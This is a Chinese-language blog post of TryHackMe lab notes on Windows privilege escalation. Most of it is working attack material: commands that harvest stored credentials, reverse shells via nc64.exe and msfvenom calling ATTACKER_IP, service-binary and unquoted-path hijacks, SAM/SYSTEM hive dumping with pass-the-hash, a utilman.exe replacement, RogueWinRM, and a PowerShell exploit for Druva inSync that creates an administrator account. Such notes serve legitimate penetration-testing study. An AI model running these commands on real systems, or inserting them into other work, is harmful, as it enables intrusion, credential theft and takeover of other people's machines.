---
title: Windows_Privilege_Escalation
date: 2024-06-06 09:25:33
updated: 2026-04-13 14:03:42
tags:
  - 打靶
  - TryHackMe
  - Jr_Penetration_Tester
  - Shells_and_Privilege_Escalation
---
[LOLBAS](https://lolbas-project.github.io/#)

```shell
# rdp连接到Windows目标机
sudo xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:Machine_IP /u:Username /p:'Password'
# 切换用户
runas /user:用户名 程序名
# 列出所有服务
sc query state=all
# 检查用户
net user username
```

# 密码收集

## **Windows的无人值守（Unattended ）安装**

```plain
此类安装需要使用管理员帐户来执行初始设置，用户凭据可能存储在机器中的以下位置：

C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

## **Powershell 历史记录**

```shell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## **保存的 Windows 凭据**

```shell
# 列出保存的凭据
cmdkey /list

# 为 其他存有凭据的用户 生成一个 shell
runas /savecred /user:admin cmd.exe
```

## IIS 配置

```shell
# IIS 上的网站配置存储在名为 web.config 的文件中
# C:\inetpub\wwwroot\web.config
# C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# 在文件中查找数据库连接字符串
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## **从软件中检索凭证：PuTTY**

```shell
# 检索PuTTY中存储的代理凭据
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## 快速提权方法(CTF)

### 计划任务

```shell
# 列出目标系统上的计划任务
schtasks /query /tn vulntask /fo list /v
## 关注“Task to Run”“和Run As User”参数

# 检查可执行文件的文件权限
icacls c:\tasks\schtask.bat

# 更改 bat 文件以生成一个反向 shell
## c:\tools\nc64.exe文件提前布置在目标机上
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

# 手动启动计划任务(需要权限)
schtasks /run /tn vulntask
```

### AlwaysInstallElevated(.msi文件提权)

```shell
# 设置两个注册表值
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# 使用 msfvenom 生成恶意 .msi 文件
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

# 在攻击机上运行Metasploit Handler模块来监听

# 将创建的文件传输到目标机，并使用以下命令运行MSI程序
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

# 滥用服务配置错误

> Windows服务
> 
> 所有服务配置都存储在注册表中HKLM\\SYSTEM\\CurrentControlSet\\Services\\
> 
> 系统中的每个服务都有一个子项。 我们可以在 ImagePath 值上看到服务所关联的可执行文件，在 ObjectName 值上看到用于启动服务的帐户，如果为服务配置了 DACL（自由访问控制列表），它将存储在名为 Security 的子项中。 默认情况下只有管理员才能修改此类注册表项。
> 
> ![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717682877624-d439ca06-61a1-496c-9063-c05ae8bb7a9f.png)

## **服务关联的可执行文件的权限不安全**

条件：对服务所关联的可执行文件具有修改权限 (M)

```shell
# 查询相关服务配置
sc qc WindowsScheduler
## BINARY_PATH_NAME 关联的执行文件
## SERVICE_START_NAME 运行服务的帐户

# 检查可执行文件的权限
icacls C:\Users\thm-unpriv\rev-svc.exe

#使用 msfvenom 生成一个payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

# 传输payload文件
python3 -m http.server #攻击机
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe #目标机powershell
##cmd
##powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.187:8000/rev-svc.exe', 'rev-svc.exe')"

# 用payload文件替换掉服务所关联的可执行文件
move WService.exe WService.exe.bkp 备份原文件
move C:\Users\thm-unpriv\rev-svc.exe WService.exe

# 授权
icacls WService.exe /grant Everyone:E
#攻击机上监听并手动重启服务(需要权限)
## nc -lvp 4445
## sc stop windowsscheduler
## sc start windowsscheduler

#注意：PowerShell 会将“sc”作为“Set-Content”的别名因此如果你在 PowerShell 环境下，你需要使用“sc.exe”来控制服务。
```

## **服务所关联的可执行文件路径未正确引用**

条件：服务所关联的可执行文件路径未正确引用 且 用户在payload预存文件夹具有 AD 和 WD 权限

> 错误引用例子：
> 
> BINARY\_PATH\_NAME : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe
> 
> SCM 会尝试按表中显示的顺序搜索每个二进制文件：
> 
> 1.  首先，搜索 C:\\MyPrograms\\Disk.exe。 如果存在，该服务将运行此可执行文件。
> 2.  如果Disk.exe不存在，它将搜索 C:\\MyPrograms\\Disk Sorter.exe。 如果存在，该服务将运行此可执行文件。
> 3.  如果Disk Sorter.exe不存在，它将搜索 C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe。 此选项预计会成功，并且通常会在默认情况下运行。

利用：  
将payload文件另存为为C:\\MyPrograms\\Disk.exe

```shell
# 查询相关服务配置
sc qc "disk sorter enterprise"

# 查看服务执行文件所在文件夹权限
icacls c:\MyPrograms
## WD - Write Data (or Add File) (写入数据或添加文件)
## AD - Append Data (or Add Subdirectory) (追加数据或添加子目录)

# 使用 msfvenom 创建payload文件
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

# 传输到目标主机
python3 -m http.server #攻击机
wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe #目标机

# 将payload文件移动
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

# 授权
icacls C:\MyPrograms\Disk.exe /grant Everyone:F

# 攻击机上监听并手动重启服务(需要权限)
## nc -lvp 4446
## sc stop "disk sorter enterprise"
## sc start "disk sorter enterprise"

#注意：PowerShell 会将“sc”作为“Set-Content”的别名因此如果你在 PowerShell 环境下，你需要使用“sc.exe”来控制服务。
```

## **服务本身权限不安全**

[AccessChk - Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

条件：BUILTIN\\\\Users 组具有 **SERVICE\_ALL\_ACCESS** 权限

```shell
# 检查服务本身的DACL
accesschk64.exe -qlc thmservice #在AccessChk目录下

# 构建另一个 exe-service 反向 shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

# 将payload文件传输到目标主机
python3 -m http.server #攻击机
wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe #目标机

# 授权
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

# 更改服务的关联可执行文件和帐户
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

# 攻击机上监听并手动重启服务(需要权限)
## nc -lvp 4447
## sc stop THMService
## sc start THMService

#注意：PowerShell 会将“sc”作为“Set-Content”的别名因此如果你在 PowerShell 环境下，你需要使用“sc.exe”来控制服务。
```

# 滥用危险权限

```shell
whoami /priv
#可利用权限的完整列表
https://github.com/gtworek/Priv2Admin
```

## **SeBackup / SeRestore权限**

```shell
# 以管理员身份打开cmd
whoami /priv ##SeBackupPrivilege & SeRestorePrivilege 

# 备份 SYSTEM 和 SAM 中的密码哈希值
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive

# 攻击机上启动一个简单的 SMB 服务器
mkdir share ##不需要进入share目录
python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
## 路径不对find / -name smbserver.py查找

# 从目标机复制到攻击机
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

# 在攻击机上使用impacket检索用户的密码哈希
cd share
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
##Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::

# 执行 Pass-the-Hash 攻击，获得 SYSTEM 级别访问权限
python /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
```

/usr/share/doc/python3-impacket/examples/smbserver.py

## SeTakeOwnership权限

思路：滥用 utilman.exe 特权来升级权限

```shell
# 以管理员身份打开cmd
whoami /priv	##SeTakeOwnershipPrivilege

# 获取 utilman.exe 的所有权
takeown /f C:\Windows\System32\Utilman.exe

# 授予当前用户对 utilman.exe 的完全权限
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F

# 将 utilman.exe 替换为 cmd.exe 的副本
C:\Windows\System32\> copy cmd.exe utilman.exe

# 锁定屏幕
# 单击“轻松访问”按钮
获得具有 SYSTEM 权限的命令提示符
```

> Utilman 是一个内置的 Windows 应用程序，用于在计算机锁定屏幕期间 提供“轻松访问”选项
> 
> ![2857591-20221111000504876-1932833778.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717842478591-cd0380d0-4954-47bd-b9a4-54f8c0b2c37f.png)
> 
> 由于 Utilman 是以 SYSTEM 权限运行的，如果我们将原始的二进制文件替换为我们构建的payload文件，我们将有效地获得目标机的 SYSTEM 权限。

## SeImpersonate / SeAssignPrimaryToke权限

LOCAL SERVICE 和 NETWORK SERVICE ACCOUNTS 已经具有此类权限

Internet Information Services (IIS)为 Web 应用程序创建一个名为“iis apppool\\defaultapppool”的类似默认帐户

利用：RogueWinRM漏洞

> RogueWinRM 漏洞：每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它会使用 SYSTEM权限自动创建一个到端口 5985 的连接。 端口 5985 通常用于 WinRM 服务，它是一个在Powershell控制台上用于实现网络远程连接的端口；你可以把它想象成 SSH，但使用的是 Powershell 来进行连接。

```shell
# webshell
whoami /priv ##SeAssignPrimaryTokenPrivilege & SeImpersonatePrivilege

# 监听
nc -lvnp 4442

# 触发 RogueWinRM 漏洞
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

# 滥用易受攻击的软件

## **未打补丁的软件**

```shell
# 转储wmic在已安装软件上收集到的信息
wmic product get name,version,vendor	#可能不会返回所有已安装的软件信息
在exploit-db、packetstorm或Google等搜索已安装软件的现有漏洞
```

[exploit-db](https://www.exploit-db.com/)、[packetstorm](https://packetstormsecurity.com/)或[Google](https://www.google.com/webhp)

### 案例研究：Druva inSync 6.6.3

```powershell
$ErrorActionPreference = "Stop"

#$cmd = "net user pwnd /add"
$cmd = "net user pwnd Pass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
```shell
以管理员身份运行cmd，More choices中切换为pwnd
net user pwnd
```

# 枚举提权的工具

## WinPEAS

```shell
# 目标机运行并将输出重定向到文件
winpeas.exe > outputfile.txt
```

[PEASS-ng/winPEAS at master · peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

## PrivescCheck

[GitHub - itm4n/PrivescCheck: Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)

提醒：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。  
可以使用如下所示的 `Set-ExecutionPolicy`cmdlet

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

## **WES-NG: Windows Exploit Suggester - Next Generation**

[GitHub - bitsadmin/wesng: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)

```shell
# 攻击机上安装并更新数据库
wes.py --update

# 目标机上，后将输出结果保存到 .txt 文件并保存到攻击机
systeminfo

# 攻击机上
wes.py systeminfo.txt
```

## **Metasploit**

如果你已经在目标系统上获取了一个Meterpreter shell，你可以在目标机上使用 `multi/recon/local_exploit_suggester` 模块列出可能影响目标系统的漏洞

# 其他资源

Windows权限提升相关的资源链接：

-   [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-   [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
-   [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
-   [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
-   [Decoder's Blog](https://decoder.cloud/)
-   [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
-   [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)